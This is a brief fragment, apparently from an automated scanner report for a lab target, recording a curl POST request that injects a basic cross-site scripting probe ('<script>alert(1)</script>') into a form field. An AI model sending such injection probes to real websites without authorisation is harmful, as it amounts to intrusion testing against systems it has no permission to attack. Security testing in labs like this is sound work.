...
**Timestamp**: Tue Aug 15 13:23:54 +0100 BST 2023
...
Date: Tue, 15 Aug 2023 12:23:52 GMT
...
**CURL command**
```sh
curl -X 'POST' -d '_=<script>alert(1)</script>' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Host: no-ip.htb' -H 'User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36' 'http://no-ip.htb/'
```
